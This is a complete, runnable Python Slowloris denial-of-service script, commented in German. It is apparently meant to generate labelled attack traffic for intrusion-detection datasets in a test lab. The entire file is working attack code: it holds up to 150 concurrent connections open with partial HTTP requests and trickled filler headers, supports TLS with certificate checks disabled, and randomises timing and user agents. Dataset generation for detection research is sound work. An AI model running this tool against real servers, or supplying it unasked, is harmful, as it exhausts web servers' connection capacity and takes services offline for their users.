"""
    python3 slowloris_gen.py 10.0.0.5 --port 80 --duration 120
    python3 slowloris_gen.py http://testserver.local/login --duration 120
    python3 slowloris_gen.py https://10.0.0.5:8443/ --duration 120
"""

import argparse
import random
import socket
import ssl
import threading
import time
from dataclasses import dataclass, field
from urllib.parse import urlsplit

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "curl/8.4.0",
    "python-requests/2.31.0",
]

PATHS = ["/", "/index.html", "/login", "/search?q=test", "/api/v1/status", "/about"]

# Header-Namen, die zum "Nachfüttern" partieller Header genutzt werden.
FILLER_HEADERS = [
    "X-a", "X-b", "Accept-Language", "Cookie", "X-Requested-With",
    "X-Forwarded-For", "Referer", "X-Custom", "Cache-Control", "Pragma",
]


@dataclass
class Stats:
    opened: int = 0
    failed: int = 0
    closed: int = 0
    active: int = 0
    lock: threading.Lock = field(default_factory=threading.Lock)

    def inc(self, attr, n=1):
        with self.lock:
            setattr(self, attr, getattr(self, attr) + n)


def resolve_target(target, port_arg, ssl_arg):
    base_path = None
    if "://" in target:
        u = urlsplit(target)
        host = u.hostname
        if host is None:
            raise ValueError(f"Konnte Host aus URL nicht lesen: {target}")
        use_ssl = (u.scheme == "https")
        port = u.port or (443 if use_ssl else 80)
        base_path = u.path or "/"
        if u.query:
            base_path += "?" + u.query
    else:
        host = target
        use_ssl = ssl_arg
        port = port_arg if port_arg is not None else (443 if use_ssl else 80)

    if ssl_arg:
        use_ssl = True
    if port_arg is not None:
        port = port_arg

    return host, port, use_ssl, base_path


def rand_line(min_len=1, max_len=40):
    name = random.choice(FILLER_HEADERS)
    value_len = random.randint(min_len, max_len)
    value = "".join(
        random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        for _ in range(value_len)
    )
    return f"{name}: {value}\r\n"


def make_socket(host, port, use_ssl, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    sock.connect((host, port))
    return sock


def slowloris_connection(host, port, use_ssl, timeout, stop_event, stats, args):
    try:
        sock = make_socket(host, port, use_ssl, timeout)
    except Exception:
        stats.inc("failed")
        return

    stats.inc("opened")
    stats.inc("active")

    # Pro Verbindung variierende Flow-Parameter.
    # Stammt der Pfad aus einer URL, wird dieser genutzt; sonst variieren.
    path = args.base_path if args.base_path else random.choice(PATHS)
    ua = random.choice(USER_AGENTS)
    interval = random.uniform(args.min_interval, args.max_interval)
    # Jede Verbindung lebt unterschiedlich lange -> unterschiedliche Flow-Dauern.
    lifetime = random.uniform(args.min_lifetime, args.max_lifetime)
    deadline = time.time() + lifetime

    try:
        # Unvollständiger initialer Request (kein abschließendes \r\n\r\n).
        initial = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/xhtml+xml\r\n"
        )
        sock.sendall(initial.encode("utf-8"))

        while not stop_event.is_set() and time.time() < deadline:
            sleep_for = interval * random.uniform(0.7, 1.3)
            end = time.time() + sleep_for
            while time.time() < end:
                if stop_event.is_set():
                    raise StopIteration
                time.sleep(min(0.25, max(0.0, end - time.time())))

            line = rand_line(args.min_header, args.max_header)
            sock.sendall(line.encode("utf-8"))

    except (StopIteration, socket.error, ssl.SSLError, OSError):
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass
        stats.inc("active", -1)
        stats.inc("closed")


def reporter(stats, stop_event, interval=5):
    start = time.time()
    while not stop_event.is_set():
        time.sleep(interval)
        with stats.lock:
            elapsed = int(time.time() - start)
            print(
                f"[{elapsed:>4}s] aktiv={stats.active:<5} "
                f"geoeffnet={stats.opened:<6} "
                f"geschlossen={stats.closed:<6} "
                f"fehlgeschlagen={stats.failed}",
                flush=True,
            )


def main():
    p = argparse.ArgumentParser(
        description="Slowloris Traffic-Generator fuer gelabelte Angriffsdatensaetze (Testaufbau)."
    )
    p.add_argument("target",
                   help="Ziel: Host/IP des Opfer-Knotens ODER volle URL "
                        "(z.B. http://host/pfad, https://10.0.0.5:8443/)")
    p.add_argument("--port", type=int, default=None,
                   help="Ziel-Port (ueberschreibt Port aus URL; "
                        "Standard 80 bzw. 443 bei --ssl/https)")
    p.add_argument("--ssl", action="store_true",
                   help="TLS erzwingen (ueberschreibt Schema aus URL)")

    p.add_argument("--connections", type=int, default=150,
                   help="Ziel-Anzahl gleichzeitiger Verbindungen")
    p.add_argument("--duration", type=int, default=0,
                   help="Gesamtlaufzeit in Sekunden (0 = bis Strg+C)")

    # Flow-Variation.
    p.add_argument("--min-interval", type=float, default=5.0,
                   help="Minimaler Abstand zwischen Teil-Headern (s)")
    p.add_argument("--max-interval", type=float, default=15.0,
                   help="Maximaler Abstand zwischen Teil-Headern (s)")
    p.add_argument("--min-lifetime", type=float, default=30.0,
                   help="Minimale Lebensdauer einer Verbindung (s)")
    p.add_argument("--max-lifetime", type=float, default=180.0,
                   help="Maximale Lebensdauer einer Verbindung (s)")
    p.add_argument("--min-header", type=int, default=1,
                   help="Minimale Laenge der Filler-Header-Werte")
    p.add_argument("--max-header", type=int, default=40,
                   help="Maximale Laenge der Filler-Header-Werte")

    p.add_argument("--spawn-interval", type=float, default=0.1,
                   help="Abstand zwischen dem Aufbau neuer Verbindungen (s)")
    p.add_argument("--timeout", type=float, default=10.0,
                   help="Socket-Timeout (s)")
    p.add_argument("--seed", type=int, default=None,
                   help="Zufalls-Seed fuer reproduzierbare Datensaetze")

    args = p.parse_args()

    if args.seed is not None:
        random.seed(args.seed)

    try:
        host, port, use_ssl, base_path = resolve_target(
            args.target, args.port, args.ssl
        )
    except ValueError as e:
        print(f"Fehler: {e}", flush=True)
        return
    # Fuer die Connection-Threads zwischenspeichern.
    args.base_path = base_path

    stats = Stats()
    stop_event = threading.Event()
    threads = []

    print(
        f"Starte Slowloris gegen {host}:{port}{base_path or ''} "
        f"(ssl={use_ssl}) | Ziel-Verbindungen={args.connections}",
        flush=True,
    )
    print("Source-IP bleibt konstant (= IP dieses Knotens) -> Label 'malicious'.\n",
          flush=True)

    rep = threading.Thread(target=reporter, args=(stats, stop_event), daemon=True)
    rep.start()

    start = time.time()
    try:
        while not stop_event.is_set():
            # Abgelaufene Threads aus der Liste entfernen.
            threads = [t for t in threads if t.is_alive()]

            # Neue Verbindungen aufbauen, bis Ziel-Parallelitaet erreicht ist.
            while stats.active < args.connections and not stop_event.is_set():
                t = threading.Thread(
                    target=slowloris_connection,
                    args=(host, port, use_ssl, args.timeout,
                          stop_event, stats, args),
                    daemon=True,
                )
                t.start()
                threads.append(t)
                time.sleep(args.spawn_interval)

            if args.duration and (time.time() - start) >= args.duration:
                print("\nLaufzeit erreicht, stoppe...", flush=True)
                stop_event.set()
                break

            time.sleep(1)

    except KeyboardInterrupt:
        print("\nAbbruch durch Benutzer, stoppe...", flush=True)
        stop_event.set()

    deadline = time.time() + 5
    for t in threads:
        remaining = deadline - time.time()
        if remaining <= 0:
            break
        t.join(timeout=remaining)

    with stats.lock:
        print(
            f"\nFertig. geoeffnet={stats.opened} "
            f"geschlossen={stats.closed} fehlgeschlagen={stats.failed}",
            flush=True,
        )


if __name__ == "__main__":
    main()